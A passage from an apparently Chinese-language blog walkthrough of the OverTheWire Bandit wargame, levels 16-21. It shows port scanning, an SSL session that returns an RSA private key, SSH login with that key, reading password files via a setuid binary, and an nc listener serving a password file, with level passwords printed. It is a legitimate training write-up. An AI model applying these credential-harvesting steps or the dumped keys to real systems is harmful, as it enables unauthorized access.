i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEMLG+bjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAL0RyGS1</span><br><span class="line">i69cWe+nvIuy5jbTI7iRjYRG/VxLwVBMK8fgDUtLBB+XcI/7t1jzT3RHtLnLIvkM</span><br><span class="line">+gwA6aLFjm4IUUER1czUCIDV3aRqXTrFfc/Q4qD93RiRNiRB2TRBXcXn4UyObYeR</span><br><span class="line">vx+JwVsn+hCBNhLxr6h44g2xhhOapb9AAKx/AgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAI/obrHO1LZ6NaQNN6mSq48DyI0pM5ew+aA/12MEKzKiOMBvl9oi</span><br><span class="line">LmFYldH4/2w0LjVX/ahvTERZAGI0n03FmP3b2lsP5cvi+74uRdqWB9A7EmE86b/3</span><br><span class="line">yeiNtz10ZS0NPrv/f51H6V0E2B07WoQcHZtqiKTnvQssyXeZ5R6rExD9</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 50D211034F68E13230C343A3F0063A226667E0390D64D4C6B6663914A1E7073B</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 4209E5BC4EE8A462F0905C0DC9EC6874396F2EE2B75E5693CB4DB07B24AD355A25807AB78820D51AC759A9621AF63523</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 12 b6 a9 22 82 e8 26 1e-12 8c c6 35 06 8e d8 3d   ...&quot;..&amp;....5...=</span><br><span class="line">    0010 - 1b 69 39 c4 35 58 cd 51-6c db 0a b0 e2 5f e7 3b   .i9.5X.Ql...._.;</span><br><span class="line">    0020 - d7 88 ff b6 c5 75 23 fc-4f 75 b8 20 60 ff 45 b6   .....u#.Ou. .E.</span><br><span class="line">    0030 - 14 cb 57 88 d0 4f bd 8e-a3 d2 2a e6 87 a5 6c 3b   ..W..O....*...l;</span><br><span class="line">    0040 - 2f ab 93 04 e3 88 93 c7-26 08 39 8c ba bd de bd   /.......&amp;.9.....</span><br><span class="line">    0050 - c0 6b 73 0b 8b 3a 51 25-41 31 15 34 ea 14 9a 83   .ks..:Q%A1.4....</span><br><span class="line">    0060 - ba 13 78 07 b8 df 42 e6-6d d6 8e 1e ad 24 e3 5e   ..x...B.m....$.^</span><br><span class="line">    0070 - 27 03 f6 91 ad 4c 9a d2-d9 93 76 c1 30 e9 20 b9   &apos;....L....v.0. .</span><br><span class="line">    0080 - 7b e8 6e b0 6f e2 de 5a-f6 0a 5c dc 88 41 29 01   &#123;.n.o..Z..\..A).</span><br><span class="line">    0090 - be 4d 30 74 9f e6 89 0d-24 f8 55 66 65 a6 5b 58   .M0t....$.Ufe.[X</span><br><span class="line">    Start Time: 1540910016</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br></pre></td></tr></table></figure><br>发现并没有什么东西<br>接下来试试另一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEMAgpsDANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK+XDMVP</span><br><span class="line">Gsi0v7AzOt9+Y1xJ7B5H4rMm9MHwPjDQhijVETNjVueyvESNsCsYoTkZ9iCrShWZ</span><br><span class="line">pbMY/5VrlLOPNCx04JqaV5dvJYqFRT7OlhlHbmCq83r0Wd6GdbqjACyj3//qQeZy</span><br><span class="line">9H0utj6DwuD0qWkAEXAwL47Zlo4femahXMSrAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAHSG/pfoYiHL3VU2FutcjcBEYFxJnDa/Dscz3xIb0A1x8dHCP1Xw</span><br><span class="line">90wlU2kbPfK8XnHDkOjj7O6b+4D4EjkhLSQEq/8S8JSPfJSxXg6gBfBpqUrgyM+P</span><br><span class="line">4Ivq7l+JHjXHe0yRXCGiea1n6KAe3u535WeFHWGbz4ncUTxbdgpM7DZW</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 6D46D124A250EED08014EE5A0C85271B86CEFF6728A4B866A4A9B62FC3ED1F71</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 67CEB3CFB568E22B2ED14F3259C7EEA720F230E4267500507E4AB52E1888F1D8B26BB2C364F84CFE9B2863287BD283A5</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - f7 99 0d 1d ee b2 67 e6-7e 92 43 0a a2 e5 e4 90   ......g.~.C.....</span><br><span class="line">    0010 - c2 5d 4e bc 49 93 53 f9-db 2a 69 e1 b1 27 fe 68   .]N.I.S..*i..&apos;.h</span><br><span class="line">    0020 - da 41 e9 12 1a c0 3e 1c-4e 33 e5 f1 3f a9 12 66   .A....&gt;.N3..?..f</span><br><span class="line">    0030 - 19 5c 8e e6 d5 5d d1 43-43 79 35 b1 30 ba e1 ed   .\...].CCy5.0...</span><br><span class="line">    0040 - d1 66 e3 d7 7c d7 ba 2e-0f 1f 2e 09 f1 cb 80 32   .f..|..........2</span><br><span class="line">    0050 - 7f 6c 8f 63 99 91 94 19-c4 54 75 cd d3 f2 a5 3d   .l.c.....Tu....=</span><br><span class="line">    0060 - e4 f5 1a 20 31 96 e6 71-a8 90 0a ed 8b b0 b8 15   ... 1..q........</span><br><span class="line">    0070 - ff a1 0e a7 4f 44 80 d2-75 d6 4e 70 57 d0 33 c6   ....OD..u.NpW.3.</span><br><span class="line">    0080 - ab 78 96 cc 00 2c 54 f4-19 43 0a 5a 3f 4c 71 b9   .x...,T..C.Z?Lq.</span><br><span class="line">    0090 - 8c 0c 00 be 62 3c 0c 2b-31 38 4b 42 3a 14 af 3a   ....b&lt;.+18KB:..:</span><br><span class="line">    Start Time: 1540910183</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">Correct!</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</span><br><span class="line">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</span><br><span class="line">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</span><br><span class="line">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</span><br><span class="line">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</span><br><span class="line">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</span><br><span class="line">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</span><br><span class="line">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</span><br><span class="line">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</span><br><span class="line">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</span><br><span class="line">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</span><br><span class="line">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</span><br><span class="line">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</span><br><span class="line">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</span><br><span class="line">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</span><br><span class="line">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</span><br><span class="line">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</span><br><span class="line">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</span><br><span class="line">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</span><br><span class="line">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</span><br><span class="line">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</span><br><span class="line">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</span><br><span class="line">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</span><br><span class="line">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</span><br><span class="line">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">closed</span><br></pre></td></tr></table></figure></p><p>可以看到成功了，我们现在把私钥保存一下，然后用私钥去登陆bandit17账户获得下一关密码<br>这我们首先需要创建一个文件来保存私钥，这个文件需要在自己的目录下，用vi命令就可以创建，然后：wq！就行<br>这一关做了两天。。。前面一直写文件有问题在最后用了qwe大佬的文件夹私钥连上去了,手动感谢大佬<br>来个完整的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ nmap localhost -p 31000-32000</span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790</span><br><span class="line">这里就需要复制私钥保存为1.private</span><br><span class="line">bandit16@bandit:~$ cd /tmp/bobo123</span><br><span class="line">bandit16@bandit:/tmp/bobo123$ ls -a</span><br><span class="line">.  ..  1.private</span><br><span class="line">bandit16@bandit:/tmp/bobo123$ ssh -i 1.private bandit17@localhost</span><br><span class="line">这里省略一点连接步骤下面是已经显示连接成功</span><br><span class="line">bandit17@bandit:~$ ls -a</span><br><span class="line">.   .bandit16.password  .bashrc        passwords.old  .ssh</span><br><span class="line">..  .bash_logout        passwords.new  .profile</span><br><span class="line">发现没有我们要的17关密码，linux系统有个etc文件夹里面会有很多密码什么的我们cd过去</span><br><span class="line">bandit17@bandit:~$ cd /etc</span><br><span class="line">bandit17@bandit:/etc$ ls -a</span><br><span class="line">.                       inetd.conf       profile</span><br><span class="line">..                      inetd.d          profile.d</span><br><span class="line">adduser.conf            .info24.txt      protocols</span><br><span class="line">adjtime                 init             .pwd.lock</span><br><span class="line">alternatives            init.d           python</span><br><span class="line">apache2                 initramfs-tools  python2.7</span><br><span class="line">apm                     inittab          python3</span><br><span class="line">apparmor                inputrc          python3.5</span><br><span class="line">apparmor.d              insserv          rc0.d</span><br><span class="line">apt                     insserv.conf     rc1.d</span><br><span class="line">bandit_pass             insserv.conf.d   rc2.d</span><br><span class="line">bash.bashrc             iproute2         rc3.d</span><br><span class="line">bash_completion         issue            rc4.d</span><br><span class="line">bash_completion.d       issue.net        rc5.d</span><br><span class="line">bindresvport.blacklist  kernel           rc6.d</span><br><span class="line">ca-certificates         kernel-img.conf  rc.local</span><br><span class="line">ca-certificates.conf    ldap             rcS.d</span><br><span class="line">calendar                ld.so.cache      reportbug.conf</span><br><span class="line">ConsoleKit              ld.so.conf       resolv.conf</span><br><span class="line">console-setup           ld.so.conf.d     rmt</span><br><span class="line">cron.d                  libaudit.conf    rpc</span><br><span class="line">cron.daily              lighttpd         rsyslog.conf</span><br><span class="line">cron.hourly             locale.alias     rsyslog.d</span><br><span class="line">cron.monthly            locale.gen       screenrc</span><br><span class="line">crontab                 localtime        securetty</span><br><span class="line">cron.weekly             logcheck         security</span><br><span class="line">dbus-1                  login.defs       selinux</span><br><span class="line">debconf.conf            logrotate.conf   services</span><br><span class="line">debian_version          logrotate.d      sgml</span><br><span class="line">default                 ltrace.conf      shadow</span><br><span class="line">deluser.conf            lvm              shadow-</span><br><span class="line">devuan_version          magic            shells</span><br><span class="line">dhcp                    magic.mime       skel</span><br><span class="line">dictionaries-common     mailcap          ssh</span><br><span class="line">discover.conf.d         mailcap.order    ssl</span><br><span class="line">discover-modprobe.conf  manpath.config   staff-group-for-usr-local</span><br><span class="line">dpkg                    mime.types       subgid</span><br><span class="line">elogind                 mke2fs.conf      subgid-</span><br><span class="line">emacs                   modprobe.d       subuid</span><br><span class="line">environment             modules          subuid-</span><br><span class="line">firewall                motd             sudoers</span><br><span class="line">fstab                   mtab             sudoers.d</span><br><span class="line">gai.conf                Muttrc           supervisor</span><br><span class="line">gdb                     Muttrc.d         sysctl.conf</span><br><span class="line">groff                   nanorc           sysctl.d</span><br><span class="line">group                   network          systemd</span><br><span class="line">group-                  NetworkManager   terminfo</span><br><span class="line">grub.d                  networks         timezone</span><br><span class="line">gshadow                 newt             tmpfiles.d</span><br><span class="line">gshadow-                nsswitch.conf    ucf.conf</span><br><span class="line">gss                     ntp.conf         udev</span><br><span class="line">hdparm.conf             opt              ufw</span><br><span class="line">host.conf               os-release       update-motd.d</span><br><span class="line">hostname                pam.conf         vim</span><br><span class="line">hosts                   pam.d            wgetrc</span><br><span class="line">hosts.allow             passwd           X11</span><br><span class="line">hosts.deny              passwd-          xdg</span><br><span class="line">identd.conf             perl             xml</span><br><span class="line">identd.key              polkit-1</span><br><span class="line">这可以看到bandit_pass，不要想别的password，一步一步来</span><br><span class="line">bandit17@bandit:/etc$ cd bandit_pass/</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ ls -a</span><br><span class="line">.         bandit11  bandit16  bandit20  bandit25  bandit3   bandit4  bandit9</span><br><span class="line">..        bandit12  bandit17  bandit21  bandit26  bandit30  bandit5</span><br><span class="line">bandit0   bandit13  bandit18  bandit22  bandit27  bandit31  bandit6</span><br><span class="line">bandit1   bandit14  bandit19  bandit23  bandit28  bandit32  bandit7</span><br><span class="line">bandit10  bandit15  bandit2   bandit24  bandit29  bandit33  bandit8</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ cat bandit25</span><br><span class="line">cat: bandit25: Permission denied            //这里我以为会有权限配置错误导致后面很多pass能读，看来出题人还是很厉害</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ cat bandit17</span><br><span class="line">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</span><br></pre></td></tr></table></figure></p><h2 id="bandit-17-18"><a href="#bandit-17-18" class="headerlink" title="bandit 17-18"></a>bandit 17-18</h2><p>Level Goal<br>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new<br>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19<br>这一关是要我们比较一下新旧密码两个文件的不同从而找出密码，这里会用到diff命令<br>diff<br>diff是Unix系统的一个很重要的工具程序。它用来比较两个文本文件的差异，是代码版本管理的基石之一。<br>diff使用格式</p><ol><li>（1）比较文件<br>[plain] view plain copy<br>diff filename_1 filename_2<br>diff filename_1 filename_2<br>（2）比较目录<br>[plain] view plain copy<br>diff dir_1 dir_2<br>diff dir_1 dir_2<br>diff命令常用的选项：<br>-b ——  忽略一行中的空字符的区别（例如“Hello World!!” 与 “Hello        World!!”认为是一样的）<br>-B —— 忽略空白行<br>-i —— 忽略大小写的不同<br>-r —— 如果diff后面接的目录时，会递归比较子目录中的文件不同<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bandit17@bandit:~$ ls -a</span><br><span class="line">.   .bandit16.password  .bashrc        passwords.old  .ssh</span><br><span class="line">..  .bash_logout        passwords.new  .profile</span><br><span class="line">bandit17@bandit:~$ diff passwords.new passwords.old</span><br><span class="line">42c42</span><br><span class="line">&lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br><span class="line">---</span><br><span class="line">&gt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</span><br></pre></td></tr></table></figure></li></ol><h2 id="bandit-18-19"><a href="#bandit-18-19" class="headerlink" title="bandit 18-19"></a>bandit 18-19</h2><p>Level Goal<br>The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.<br>Commands you may need to solve this level<br>ssh, ls, cat<br>这一关需要我们ssh连接读readme，但是设置了ssh一连就会断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p2220 ls</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line">bandit18@bandit.labs.overthewire.org&apos;s password: </span><br><span class="line">readme</span><br></pre></td></tr></table></figure><br>我们可以后面拼接命令试一下 看到ls可以执行<br>直接cat flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p2220 cat ./readme</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line">bandit18@bandit.labs.overthewire.org&apos;s password: </span><br><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure></p><h2 id="bandit-19-20"><a href="#bandit-19-20" class="headerlink" title="bandit 19-20"></a>bandit 19-20</h2><p>这一关比较复杂我直接用中文写：<br>要访问下一级别<br>您应该在homedirectory中使用setuid二进制文件。在没有参数的情况下执行它以找出如何使用它。<br>在使用setuid二进制文件后，可以在通常的位置（/ etc / bandit_pass）找到此级别的密码。<br>介绍一下setduid<br>什么是SetUID<br>我们知道，在linux的命令行下执行“ps -aux”命令时，就会列出当前系统中的所有进程，在其中可以看到每个进程都和用户的真实id关联，实际上，Linux中的每个进程还跟一个称为有效用户id（set User id）紧密关联。<br>前者用于表示该进程由那个用户控制，后者用于为新建立的文件分配所有权，检查文件访问许可等操作，同时有效用户为该文件的所有者。<br>linux系统内核允许一个进程以调用一个SetUID程序（或显示执行SetUID系统调用）的方式，来改变其自身的有效用户id。<br>更详细的可以看这里：<a href="https://blog.csdn.net/oo__yan/article/details/7076889" target="_blank" rel="noopener">https://blog.csdn.net/oo__yan/article/details/7076889</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bandit19@bandit:~$ ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwsr-x--- 1 bandit20 bandit19 7296 Oct 16 14:00 bandit20-do</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do </span><br><span class="line">Run a command as another user.</span><br><span class="line">  Example: ./bandit20-do id</span><br><span class="line">  bandit19@bandit:~$ ./bandit20-do  id</span><br><span class="line">uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)</span><br><span class="line">我们看到这里euid是bandit20的，直接用他去读密码</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure></p><h2 id="bandit-20-21"><a href="#bandit-20-21" class="headerlink" title="bandit 20-21"></a>bandit 20-21</h2><p>Level Goal<br>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).<br>NOTE: Try connecting to your own network daemon to see if it works as you think<br>Commands you may need to solve this level<br>ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &amp;, CTRL-Z, …)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20&amp;</span><br><span class="line">[2] 7178</span><br><span class="line">bandit20@bandit:~$ ./suconnect 2333</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">Password matches, sending next password</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br><span class="line">[2]+  Done                    nc -l -p 2333 &lt; /etc/bandit_pass/bandit20</span><br></pre></td></tr></table></figure><br>我监听了2333端口，随便哪个端口都可以。然后用suconnect连接上就ok</p><h2 id="bandit-21-22"><a href="#bandit-21-22" class="headerlink" title="bandit 21-22"></a>bandit 21-22</h2><p>Level Goal<br>A program is running automatically at regular intervals from 